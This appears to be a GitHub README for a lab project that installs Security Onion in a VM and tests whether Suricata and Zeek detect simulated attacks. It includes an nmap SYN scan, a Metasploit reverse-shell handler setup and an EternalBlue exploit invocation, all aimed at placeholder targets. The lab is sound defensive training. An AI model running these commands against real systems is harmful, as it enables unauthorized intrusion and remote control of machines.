


## 🛡️ Project Title  
# security-onion-threat-detection

## 🎯 Objective  
The main objective of this project is to guide users in **installing and configuring Security Onion** on a virtual machine and **simulating cyber-attacks** to assess how well Security Onion detects and monitors different types of network intrusions.

## ⚙️ Tools and Technologies  
- **Security Onion** – Open-source intrusion detection, enterprise security monitoring, and log management.  
- **Virtual Machine (VM)** – Virtualized environment using **VirtualBox** or **VMware**.  
- **Kali Linux** – Used for running attack simulations.  
- **Other Tools** – **Nmap, Metasploit** for penetration testing.  

---

## 📌 Section 1: Introduction  
### **What is Security Onion?**  
Security Onion is a **Linux distribution** designed for **intrusion detection** and **network security monitoring**. It includes tools like **Suricata, Zeek, Elasticsearch, Kibana, and TheHive** for **threat detection, alerting, and analysis**.

### **Why Security Onion?**  
Security Onion offers **powerful and easy-to-use tools** for **monitoring, analyzing, and defending** against cyber threats. It is widely used for **enterprise SOCs (Security Operations Centers)** and cybersecurity training.

---

## ⚙️ Section 2: Setting Up the Virtual Machine (VM)  
### **Prerequisites**  
- A system with **at least 16GB RAM and 200GB of free disk space**.  
- **VirtualBox** or **VMware Workstation** installed.  
- **Security Onion ISO** from the [official download page](https://securityonion.net).  
- A secondary system (or VM) running **Kali Linux** for attack simulation.  

### **Installation Steps**  
#### **Step 1: Download the ISO Image**  
1. Visit the [Security Onion website](https://securityonion.net) and download the latest **ISO file**.  

#### **Step 2: Set Up the Virtual Machine**  
1. Open **VirtualBox** (or **VMware**).  
2. Create a new VM and configure it with:
   - **OS Type:** Linux (Ubuntu 64-bit)  
   - **Memory Size:** At least **16GB RAM**  
   - **Hard Disk:** **200GB** dynamically allocated  
3. Attach the downloaded ISO image.  
4. Start the VM and complete the installation wizard.  

#### **Step 3: Configure Network Interfaces**  
- Choose **Bridged** or **NAT** mode for network configuration.  
- Assign a **static IP** for easier monitoring.  

#### **Step 4: Finalizing Installation**  
- Configure **sensors and management nodes** as per project needs.  
- Choose **Standalone** or **Distributed** deployment.  
- Access the **Security Onion Web Interface** for further configurations.  

---

## ⚔️ Section 3: Simulating Attacks and Testing Detection Capabilities  
### **Prerequisites**  
- **Kali Linux** as the attack machine.  
- **Security Onion** running and monitoring network traffic.  

### **Simulated Attacks**  
#### **1️⃣ Nmap Scan**  
- **Objective:** Test if Security Onion detects **network scanning**.  
- **Tools Used:** Nmap  
- **Attack Steps:**  
  ```bash
  nmap -sS <Target_IP>
  ```  
- **Expected Outcome:** Security Onion should trigger an alert for **network scanning behavior (SYN scan)**.
![Screenshot 2025-02-17 065010](https://github.com/user-attachments/assets/98604f55-4569-4df7-a12f-1646bdc06ad6)

#### **2️⃣ Metasploit Reverse Shell Attack**  
- **Objective:** Test Security Onion's detection of **remote exploits**.  
- **Tools Used:** Metasploit Framework  
- **Attack Steps:**  
  ```bash
  msfconsole
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set LHOST <Your_Kali_IP>
  set LPORT 4444
  exploit
  ```  
- **Expected Outcome:** Security Onion should detect the exploit attempt via **Suricata or Zeek IDS logs**.

---

## 📊 Section 4: Analyzing Results  
### **1️⃣ Review Alerts in Security Onion**  
- Log into the **Kibana Dashboard** to review alerts.  
- Check alerts from **Suricata (IDS)** and **Zeek**.  
- **Nmap Scan Detection:** Look for **PORTSCAN or SYN scan detected** alerts.  
- **Metasploit Exploit Detection:** Look for **exploit attempt logs** in Suricata and Zeek.
![Screenshot 2025-02-17 064928](https://github.com/user-attachments/assets/8447be21-a0ac-471a-9c2d-5eaabac77283)

### **2️⃣ Log Analysis**  
- Use **Suricata logs** to track detected attacks.  
- **Zeek logs** can help analyze suspicious network behavior.  
- Utilize **Elasticsearch/Kibana** for deeper investigation.
![Screenshot 2025-02-17 094516](https://github.com/user-attachments/assets/385c85c2-2489-44d0-80c9-264bf77f6e21)

### **3️⃣ Countermeasures**  
- Implement **firewall rules** to restrict unauthorized scans.  
- Use **network segmentation** to isolate critical systems.  
- Fine-tune **IDS/IPS rules** to detect and mitigate threats.  

---

## ✅ Section 5: Conclusion and Recommendations  
### **Summary of Findings**  
- Security Onion successfully detected **Nmap scanning** and **Metasploit reverse shell exploits**.  
- **Kibana dashboards** provided detailed threat insights.  
- **Suricata & Zeek logs** were useful in analyzing network traffic anomalies.

### **Recommended Improvements**  
- **Regularly update IDS/IPS signatures** to improve detection.  
- **Implement automated response mechanisms** for real-time blocking.  
- **Enhance network logging & monitoring** for better forensic analysis.

---

## 📜 Appendix A: Useful Commands and References  
### **Basic Nmap Scan Command**  
```bash
nmap -sS <Target_IP>
```

### **Metasploit Command for Exploitation**  
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <Target_IP>
exploit
```

---

## 🚨 Disclaimer  
This project is for **educational and ethical hacking purposes only**. Always conduct penetration testing in a **controlled and authorized environment**.  
